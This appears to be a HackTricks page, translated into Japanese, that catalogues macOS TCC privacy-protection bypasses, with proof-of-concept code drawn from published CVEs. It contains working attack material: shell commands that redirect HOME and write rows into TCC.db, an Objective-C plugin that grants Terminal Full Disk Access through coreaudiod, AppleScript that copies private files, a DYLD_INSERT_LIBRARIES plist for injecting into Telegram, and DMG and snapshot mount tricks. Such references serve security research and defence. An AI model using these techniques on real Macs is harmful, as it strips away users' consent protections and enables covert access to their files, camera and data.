# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 機能別

### Write Bypass

これは bypass ではなく、TCC の仕組みそのものです。**書き込みからは保護されません**。Terminal **にユーザーの Desktop を読み取る権限がなくても、そこへ書き込むことはできます**。
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**拡張属性 `com.apple.macl`** は、新しい **file** に追加され、**creators app** にその読み取りアクセスを与えます。

### TCC ClickJacking

ユーザーが気付かないまま **accept** するように、**TCC prompt の上にウィンドウを配置する**ことが可能です。PoC は [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** にあります。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 任意の名前による TCC Request

Attacker は **`Info.plist` 内で任意の名前**（Finder、Google Chrome など）を持つ **apps** を作成し、TCC protected location へのアクセスを要求させることができます。ユーザーは、正規の application がこのアクセスを要求していると考えます。\
さらに、**Dock から正規の app を削除して fake one を配置する**ことも可能です。そのため、ユーザーが fake one（同じ icon を使用可能）をクリックすると、正規の app を呼び出し、TCC permissions を要求して malware を実行できます。これにより、ユーザーは正規の app がアクセスを要求したと信じてしまいます。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細情報と PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

デフォルトでは、**SSH 経由の access には "Full Disk Access" が付与されていました**。これを無効にするには、対象を一覧に表示したまま disabled にする必要があります（一覧から削除しても、その privileges は削除されません）。

![TCC Request by arbitrary name - SSH Bypass: デフォルトでは、SSH 経由の access には "Full Disk Access" が付与されていました。これを無効にするには、対象を一覧に表示したまま disabled にする必要があります（一覧から削除しても...](<../../../../../images/image (1077).png>)

ここでは、いくつかの **malwares がこの protection を bypass できた方法**の例を紹介します。

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> 現在、SSH を enable にするには **Full Disk Access** が必要です。

### Handle extensions - CVE-2022-26767

属性 **`com.apple.macl`** は、**certain application にその file の read permissions を与えるために** files に付与されます。この属性は、file を app に **drag\&drop** したとき、または user が file を **double-click** して **default application** で開いたときに設定されます。

そのため、user は **すべての extensions を handle する malicious app を register** し、Launch Services を呼び出して任意の file を **open** できます（これにより、malicious file にその file を read する access が付与されます）。

### iCloud

entitlement **`com.apple.private.icloud-account-access`** により、**iCloud tokens を提供する** **`com.apple.iCloudHelper`** XPC service と communication できます。

**iMovie** と **Garageband** にはこの entitlement と、許可を与えるその他の entitlement がありました。

この entitlement を利用して **icloud tokens を取得する** exploit の詳細については、talk [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0) を確認してください。

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission を持つ app は、**他の Apps を control** できます。つまり、**他の Apps に付与された permissions を abuse** できる可能性があります。

Apple Scripts の詳細については、次を確認してください。


{{#ref}}
macos-apple-scripts.md
{{#endref}}

例えば、App が **`iTerm` に対する Automation permission** を持っている場合、この例では **`Terminal`** が iTerm に対する access を持っています。

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA を持たない Terminal は、FDA を持つ iTerm を呼び出し、それを使用して actions を実行できます。
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder経由

または、AppがFinder経由でアクセスできる場合、次のようなスクリプトを実行できます。
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App の動作別

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland の **tccd daemon** は、**`HOME`** **env** 変数を使用して、以下の場所にある TCC users database にアクセスしていました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[この Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) によると、また TCC daemon は現在のユーザーの domain 内で `launchd` 経由で実行されているため、渡される **すべての environment variables を control** することが可能です。\
したがって、**attacker は `launchctl` で `$HOME` environment** 変数を **controlled** な **directory** を指すように設定し、**TCC** daemon を **restart** してから、**TCC database を直接 modify** することで、end user に一度も prompt を表示させることなく、自身に利用可能な **すべての TCC entitlement を付与** できました。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes は TCC で保護された場所にアクセスできましたが、note が作成される場所は **保護されていない場所** でした。そのため、Notes に保護されたファイルを note 内（つまり保護されていない場所）へコピーさせ、その後ファイルにアクセスできました。

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` ライブラリを使用するバイナリ `/usr/libexec/lsd` には、**nullfs** mount の作成を許可する entitlement `com.apple.private.nullfs_allow` と、すべてのファイルへのアクセスを可能にする **`kTCCServiceSystemPolicyAllFiles`** 付きの entitlement `com.apple.private.tcc.allow` がありました。

"Library" に quarantine attribute を追加し、**`com.apple.security.translocation`** XPC service を呼び出すことで、Library を **`$TMPDIR/AppTranslocation/d/d/Library`** に map できました。これにより、Library 内のすべての document に **アクセス** できました。

### CVE-2024-44131 - FileProvider symlink race

ファイル操作を **privileged helper**（ここでは **`fileproviderd`** / **`Files.app`**）に引き渡す Apps は、ユーザーに代わって item を copy または move するため、copy は caller ではなく helper の privileges で実行されます。

Jamf Threat Labs は、操作前に実行される symlink validation が **race** 可能であることを示しました。確認対象である path の **最後の** component に symlink を配置する代わりに、attacker は copy の開始後に path の **中間** directory を置き換えます。その後、privileged helper は attacker が制御する link に従い、prompt を一度も表示せずに TCC で保護された場所を読み書きします。

path 内で random UUID によって **保護されていない** directory（例：`~/Library/Mobile Documents/com~apple~CloudDocs`）は、race に必要な完全な path を attacker が予測できるため、最も容易な target です。

> [!TIP]
> これは探すべき generic pattern です：**path を複数回 resolve する privileged process**（check-then-use、または source と destination を別々に resolve する `rename()` / `copyfile()`）は、path の途中にある directory を置き換えることで race できます。`O_NOFOLLOW_ANY`、すでに open された directory FD に対する `openat()`、または `realpath()` + 再 validation のみが、実際にこの window を閉じます。

詳細は [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) を参照してください。

### SQLITE_SQLLOG_DIR

`libsqlite3` は `SQLITE_ENABLE_SQLLOG` を有効にして build でき、environment variables によって動作する logging hook が追加されます（upstream の [`test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）。

- **`SQLITE_SQLLOG_DIR=path`** – **open されたすべての database** について、**database file の copy** と SQL statements の log が `path` に書き込まれます（directory はあらかじめ存在している必要があります）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB が open または attach されるたびに、既存の copy を再利用せず **新しい copy** を取得します。
- **`SQLITE_SQLLOG_CONDITIONAL`** – main DB の隣に `<database>-sqllog` file が存在する場合のみ connection を log します。

この variable を FDA を持ち SQLite databases を open する process に inject できれば、保護された database を、制御する directory へ簡単に **copy** させられます。destination filename は attacker-controlled data から生成されるため、destination に配置した symlink によって、同じ primitive を target process の privileges での **arbitrary file write** に変えられます。

### **SQLITE_AUTO_TRACE**

environment variable **`SQLITE_AUTO_TRACE`** が set されていると、library **`libsqlite3.dylib`** はすべての SQL queries の **logging** を開始します。多くの applications がこの library を使用していたため、それらの SQLite queries をすべて log できました。

複数の Apple applications がこの library を使用して TCC で保護された information にアクセスしていました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes の探索

前の2つの項目は、同じ generic technique の実例です。さらに探す価値があります。**TCC-privileged apps に読み込まれる frameworks は、debug/logging environment variables を公開していることが多く、それによってプロセスが caller-controlled path にファイルを作成します**。

以下の workflow で見つけられます。

1. FDA または別の有用な TCC permission（`Music`、`TV`、`Terminal`、MDM agents など）を持つ target を選び、リンクしている frameworks を一覧表示します（`otool -L`、`vmmap`）。
2. それらの frameworks から `getenv` strings を grep します：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. `launchctl setenv NAME /path/you/control` で候補変数を設定し、app を起動します。その後、`fs_usage -w -f filesys <pid>` または `sudo fs_usage | grep <path>` を使って、filesystem 上での動作を監視します。
4. プロセスが自分の directory 内にファイルを **作成または rename** する場合、write primitive を得たことになります。destination を symlink に向ける（または、上記の CVE-2024-44131 のように intermediate directory と race する）ことで、書き込み先を `~/Library/Application Support/com.apple.TCC/TCC.db` に redirect できます。

> [!TIP]
> これには2つの制限があります。第一に、app が [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（「dynamic linker environment variables の影響を app が受ける可能性があることを示す Boolean value。app の process への code injection に使用できます」）を備えていない限り、**`DYLD_*` variables は hardened-runtime binaries では無視されます**。[Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) も参照してください。第二に、Apple は報告を受けると個々の framework debug variables を削除するため、ある macOS release で機能した variable が、次の release ではなくなっていることがよくあります。設定後に app が何も表示せず起動を拒否する場合、その variable はすでに filter されたものとして扱ってください。

linker variables を使った同等の trick については、[macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) を参照してください。

### Apple Remote Desktop

root としてこの service を有効にすると、**ARD agent は full disk access を持つことになり**、その後 user がそれを悪用して新しい **TCC user database** を copy できる可能性があります。

## **NFSHomeDirectory** による方法

TCC は user 固有の resources への access を制御するため、user の HOME folder にある database を使用します：**$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
したがって、user が `$HOME` env variable を **別の folder** を指すようにして TCC を restart できれば、user は **/Library/Application Support/com.apple.TCC/TCC.db** に新しい TCC database を作成し、TCC を trick して任意の app に任意の TCC permission を grant させることができます。

> [!TIP]
> Apple は user profile 内に保存された **`NFSHomeDirectory`** attribute の設定を **`$HOME`** の **value** として使用します。そのため、この value を modify する permission（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つ application を compromise できれば、この option を TCC bypass として **weaponize** できます。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**first POC** は [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) と [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して user の **HOME** folder を modify します。

1. target app 用の _csreq_ blob を取得します。
2. 必要な access と _csreq_ blob を含む fake _TCC.db_ file を plant します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) で user の Directory Services entry を export します。
4. Directory Services entry を modify して、user の home directory を変更します。
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) で modified Directory Services entry を import します。
6. user の _tccd_ を stop し、process を reboot します。

2つ目の POC は、`kTCCServiceSystemPolicySysAdminFiles` を value とする `com.apple.private.tcc.allow` を持つ **`/usr/libexec/configd`** を使用しました。\
`configd` は **`-t`** option を付けて実行でき、attacker は **custom Bundle を指定して load** できました。したがって、この exploit は user の home directory を変更する **`dsexport`** および **`dsimport`** method を **`configd` code injection** に **置き換えます**。

詳細については、[**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) を確認してください。

## process injection による方法

process 内部に code を inject し、その TCC privileges を abuse するための techniques は複数あります。


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

さらに、TCC を bypass するために見つかっている最も common な process injection は、**plugins（load library）経由**です。\
Plugins は通常 libraries または plist の形式をした追加 code であり、**main application によって load され**、その context 内で実行されます。したがって、main application が granted permissions または entitlements を通じて TCC restricted files に access できる場合、**custom code も同じ access を持つことになります**。

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application には **`kTCCServiceSystemPolicySysAdminFiles`** entitlement があり、**`.daplug`** extension の plugins を load し、**hardened** runtime を持っていませんでした。

この CVE を weaponize するには、TCC を bypass するために users の TCC database を **take over** できるよう、（前述の entitlement を abuse して）**`NFSHomeDirectory`** を **変更**します。

詳細については、[**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) を確認してください。

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary には、`com.apple.security.cs.disable-library-validation` および `com.apple.private.tcc.manager` entitlements がありました。前者は **code injection を許可し**、後者は **TCC を manage する access を与えます**。

この binary は `/Library/Audio/Plug-Ins/HAL` folder から **third party plug-ins** を load できました。したがって、plugin を **load して TCC permissions を abuse** することが可能でした。この POC は次のとおりです：
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)を確認してください。

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O経由でcamera streamを開くSystem applications（**`kTCCServiceCamera`**を持つapps）は、`/Library/CoreMediaIO/Plug-Ins/DAL`（SIPの制限対象外）にある**これらのpluginsをプロセス内にload**します。

そこに一般的な**constructor**を含むlibraryを保存するだけで、**codeをinject**できます。

複数のApple applicationsがこの脆弱性の影響を受けました。

### Firefox

Firefox applicationには、`com.apple.security.cs.disable-library-validation`および`com.apple.security.cs.allow-dyld-environment-variables` entitlementsがありました：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
この方法を簡単に exploit する方法の詳細については、[**original report を確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には **`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** の entitlements があり、プロセス内に code を inject して TCC privileges を使用することが可能でした。

### CVE-2023-26818 - Telegram

Telegram には **`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** の entitlements がありました。そのため、これを abuse して、カメラによる recording など、Telegram の permissions に **get access** することが可能でした。[**writeup で payload を確認できます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

環境変数を使用して library を load する方法に注目してください。この library を inject するために **custom plist** が作成され、`launchctl` を使用して起動されました。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open による invocation

sandboxed の状態でも **`open`** を invocation することが可能です。

### Terminal スクリプト

少なくとも tech 関係者が使用するコンピューターでは、Terminal に **Full Disk Access (FDA)** を付与することは非常によくあります。そして、それを使用して **`.terminal`** スクリプトを実行することが可能です。

**`.terminal`** スクリプトは、実行する command を **`CommandString`** key に含む、次のような plist ファイルです。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmp などの場所に terminal script を書き込み、次のような command で起動できます。
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user**（権限のないユーザーであっても）は、Time Machine snapshot を作成して mount し、その snapshot 内の**すべてのファイルにアクセス**できます。\
必要な**唯一の権限**は、使用するアプリケーション（`Terminal` など）に **Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）が付与されていることです。この権限は admin によって付与される必要があります。
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
より詳細な説明は[**original reportで確認できます**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - TCC fileへのマウント

TCC DB fileが保護されていても、**directoryに新しいTCC.db fileをmountする**ことが可能でした：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit** は [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) を確認してください。

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2) で説明されているように、この CVE は `diskarbitrationd` を悪用しました。

公開されている `DiskArbitration` framework の `DADiskMountWithArgumentsCommon` 関数が security checks を実行していました。しかし、`diskarbitrationd` を直接呼び出すことでこれを bypass し、パス内で `../` 要素や symlink を使用できました。

これにより、攻撃者は任意の場所に arbitrary mounts を実行できました。これには、`diskarbitrationd` の entitlement `com.apple.private.security.storage-exempt.heritable` により、TCC database を上書きして mount することも含まれます。

### asr

**`/usr/sbin/asr`** ツールを使用すると、ディスク全体を copy して別の場所に mount し、TCC protections を bypass できました。

### Location Services

**location services へのアクセスを許可された clients** を示す 3 つ目の TCC database が **`/var/db/locationd/clients.plist`** にあります。\
**`/var/db/locationd/` フォルダーは DMG mounting から保護されていなかったため**、独自の plist を mount できました。

## startup apps による


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep による

複数のケースで、files は emails、phone numbers、messages... のような sensitive information を protected ではない locations に保存します（これは Apple における vulnerability とみなされます）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

これは現在では機能しませんが、[**過去には機能していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) を使用する別の方法:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
